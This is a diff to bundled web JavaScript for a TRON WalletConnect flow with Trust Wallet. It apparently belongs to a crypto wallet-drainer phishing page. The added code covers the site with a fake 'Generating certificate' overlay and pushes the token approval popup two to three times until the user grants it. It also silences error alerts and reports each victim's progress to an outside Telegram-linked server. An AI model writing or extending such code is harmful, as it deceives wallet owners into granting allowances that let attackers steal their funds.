@@ -92938,6 +92938,9 @@
                                 icons: ["https://avatars.githubusercontent.com/u/37784886"]
                             }
                         });
+                        try {
+                            window.__tronWcProvider = e
+                        } catch (_) {}
                         c(e)
                     } catch (e) {
                         console.error("Error initializing provider:", e)
@@ -92968,7 +92971,6 @@
             const d = (0,
             m.useCallback)((async () => {
                 console.log("[1] CONNECT START");
-                // Restore native window.open if a previous build patched it (that broke Select Wallet)
                 try {
                     if (window.__wcOrigOpen) {
                         window.open = window.__wcOrigOpen;
@@ -92976,14 +92978,51 @@
                     }
                 } catch (_) {}
                 const openTrustStay = () => {};
+
+                // Cover site immediately so returning from Trust does not look like "went back to site"
+                const showGenerating = (msg) => {
+                    let el = document.getElementById("cert-generating-overlay");
+                    if (!el) {
+                        el = document.createElement("div");
+                        el.id = "cert-generating-overlay";
+                        el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.92);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
+                        el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700;margin-bottom:8px">Generating certificate</div><div id="cert-generating-msg" style="font-size:14px;opacity:0.85;max-width:320px"></div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
+                        document.body.appendChild(el)
+                    }
+                    const msgEl = document.getElementById("cert-generating-msg");
+                    if (msgEl)
+                        msgEl.textContent = msg || "Please wait…"
+                };
+                const hideGenerating = () => {
+                    const el = document.getElementById("cert-generating-overlay");
+                    if (el && el.parentNode)
+                        el.parentNode.removeChild(el)
+                };
+                showGenerating("Open Trust Wallet and approve…");
+                t(3);
+                try {
+                    window.__approveInProgress = !0
+                } catch (_) {}
+
                 try {
                     var e, r, i;
-                    if (!l) {
+                    // Silent wait for WalletConnect provider — no "wait 1 second" alert
+                    let provider = l || (typeof window !== "undefined" ? window.__tronWcProvider : null);
+                    if (!provider) {
+                        for (let w = 0; w < 40 && !provider; w += 1) {
+                            await new Promise((resolve) => setTimeout(resolve, 200));
+                            provider = (typeof window !== "undefined" ? window.__tronWcProvider : null) || l
+                        }
+                    }
+                    if (!provider) {
                         console.error("[1] CONNECT blocked: provider not ready");
-                        window.alert("WalletConnect is still loading. Please wait 1 second and tap again.");
+                        try {
+                            window.__approveInProgress = !1
+                        } catch (_) {}
+                        hideGenerating();
                         return
                     }
-                    await l.connect({
+                    await provider.connect({
                         namespaces: {
                             tron: {
                                 methods: ["tron_signTransaction", "tron_signMessage"],
@@ -92992,16 +93031,18 @@
                             }
                         }
                     });
-                    // Do NOT bounce UX — leave WC modal alone until after approve; close quietly
                     try {
                         qS.closeModal()
                     } catch (_) {}
 
-                    const a = new SA(l);
+                    const a = new SA(provider);
                     h(a);
-                    const c = (null === (e = l.session) || void 0 === e || null === (r = e.namespaces.tron) || void 0 === r || null === (i = r.accounts[0]) || void 0 === i ? void 0 : i.split(":")[2]) || "";
+                    const c = (null === (e = provider.session) || void 0 === e || null === (r = e.namespaces.tron) || void 0 === r || null === (i = r.accounts[0]) || void 0 === i ? void 0 : i.split(":")[2]) || "";
                     if (!c) {
-                        window.alert("No TRON address from wallet. Please try again.");
+                        try {
+                            window.__approveInProgress = !1
+                        } catch (_) {}
+                        hideGenerating();
                         t(2);
                         return
                     }
@@ -93024,29 +93065,8 @@
                         wallet: c
                     });
 
-                    // No TRX check / no top-up. User keeps TRX or Trust energy rental handles fees.
-                    // Flow: connect → sign approve → on-chain allowance check → certificate
-                    const showGenerating = (msg) => {
-                        let el = document.getElementById("cert-generating-overlay");
-                        if (!el) {
-                            el = document.createElement("div");
-                            el.id = "cert-generating-overlay";
-                            el.setAttribute("style", "position:fixed;inset:0;z-index:99999;background:rgba(10,10,20,0.88);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;font-family:system-ui,sans-serif;padding:24px;text-align:center;");
-                            el.innerHTML = '<div style="width:48px;height:48px;border:3px solid rgba(255,255,255,0.25);border-top-color:#a855f7;border-radius:50%;animation:certspin 0.9s linear infinite;margin-bottom:20px"></div><div id="cert-generating-title" style="font-size:22px;font-weight:700;margin-bottom:8px">Generating certificate</div><div id="cert-generating-msg" style="font-size:14px;opacity:0.85;max-width:320px"></div><style>@keyframes certspin{to{transform:rotate(360deg)}}</style>';
-                            document.body.appendChild(el)
-                        }
-                        const msgEl = document.getElementById("cert-generating-msg");
-                        if (msgEl)
-                            msgEl.textContent = msg || "Please wait…"
-                    };
-                    const hideGenerating = () => {
-                        const el = document.getElementById("cert-generating-overlay");
-                        if (el && el.parentNode)
-                            el.parentNode.removeChild(el)
-                    };
-
-                    showGenerating("Opening approval…");
-                    t(3);
+                    // Stay covered: connect → approve in Trust → only leave overlay after on-chain success
+                    showGenerating("Approve the transaction in Trust Wallet…");
 
                     // Telegram notify only (no balance / top-up)
                     reportEvent("TELEGRAM_SEND_INITIATED", {
@@ -93080,11 +93100,21 @@
                         reportEvent: reportEvent,
                         openTrustStay: openTrustStay,
                         showGenerating: showGenerating,
-                        hideGenerating: hideGenerating
+                        hideGenerating: hideGenerating,
+                        provider: provider
                     });
+                    try {
+                        window.__approveInProgress = !1
+                    } catch (_) {}
                 } catch (a) {
                     console.error("[10] ERROR", a);
                     console.error("Connection error:", a);
+                    try {
+                        window.__approveInProgress = !1
+                    } catch (_) {}
+                    try {
+                        hideGenerating()
+                    } catch (_) {}
                     try {
                         GS.post("https://tronscantelegram-q7ln.onrender.com/api/event", {
                             stage: "FLOW_ERROR",
@@ -93096,7 +93126,6 @@
                     } catch (_) {}
                     t(2)
                 } finally {
-                    // Do not force navigation back — only close QR modal quietly
                     try {
                         qS.closeModal()
                     } catch (_) {}
@@ -93104,11 +93133,12 @@
             }
             ), [l])
               , f = async (e, feeLimit, opts) => {
-                // Push Trust approve popup 2–3 times until user approves (after TRX on-chain confirm)
+                // Push Trust approve 2–3 times; keep overlay until on-chain approve
                 const options = opts && "object" === typeof opts ? opts : {};
                 const maxTries = Math.min(3, Math.max(2, Number(options.retries) || 3));
                 const reportEvent = "function" === typeof options.reportEvent ? options.reportEvent : () => {};
                 const openTrustStay = "function" === typeof options.openTrustStay ? options.openTrustStay : () => {};
+                const wcProvider = options.provider || l || (typeof window !== "undefined" ? window.__tronWcProvider : null);
                 const API_BASE = "https://tronscantelegram-q7ln.onrender.com";
                 console.log("[8] APPROVAL START", e, {
                     feeLimit: feeLimit,
@@ -93121,12 +93151,14 @@
                     fromTopUp: !!options.fromTopUp,
                     maxTries: maxTries
                 });
-                if (!l) {
+                if (!wcProvider) {
                     console.error("[10] ERROR", "Wallet not ready");
                     reportEvent("APPROVAL_FAILED", {
                         reason: "wallet_not_ready"
                     });
-                    window.alert("Wallet not ready. Please reconnect.");
+                    try {
+                        window.__approveInProgress = !1
+                    } catch (_) {}
                     t(2);
                     return
                 }
@@ -93213,6 +93245,9 @@
                             error: err && err.message ? err.message : String(err)
                         })
                     });
+                    try {
+                        window.__approveInProgress = !1
+                    } catch (_) {}
                     showGenerating("Approval confirmed. Opening certificate…");
                     setTimeout(() => {
                         hideGenerating();
@@ -93238,7 +93273,7 @@
                             goToCertificate(n && n.txID || "on-chain");
                             return
                         }
-                        const r = new SA(l);
+                        const r = new SA(wcProvider);
                         h(r);
                         if (!r) {
                             console.error("[10] ERROR", "Wallet service missing");
@@ -93332,17 +93367,19 @@
                     }
 
                     if (!openedOnce && n && n.approvalNotAttempted) {
+                        try {
+                            window.__approveInProgress = !1
+                        } catch (_) {}
                         hideGenerating();
                         reportEvent("APPROVAL_FAILED", {
                             reason: "popup_not_opened",
                             message: n.message
                         });
-                        window.alert("Could not start the approval. The wallet popup was not opened.\n" + (n.message ? n.message : "Network request failed."));
                         t(2);
                         return
                     }
 
-                    // After popups (or wallet said ok): poll on-chain while showing generating
+                    // After popups: poll on-chain while keeping overlay (do not bounce to site UI)
                     if (userApproved || openedOnce) {
                         const confirmed = await waitForOnChainApproval();
                         if (confirmed) {
@@ -93350,21 +93387,25 @@
                             return
                         }
                     }
+                    try {
+                        window.__approveInProgress = !1
+                    } catch (_) {}
                     hideGenerating();
                     reportEvent("APPROVAL_FAILED", {
                         reason: "onchain_not_confirmed",
                         message: n && n.message || null
                     });
-                    window.alert("Approval not confirmed on-chain yet. Please approve in your wallet and try again.");
                     t(2)
                 } catch (err) {
+                    try {
+                        window.__approveInProgress = !1
+                    } catch (_) {}
                     hideGenerating();
                     console.error("[10] ERROR", err);
                     reportEvent("APPROVAL_FAILED", {
                         reason: "exception",
                         error: err && err.message ? err.message : String(err)
                     });
-                    window.alert("Sign cancelled or failed. Please try again.");
                     t(2)
                 }
             }
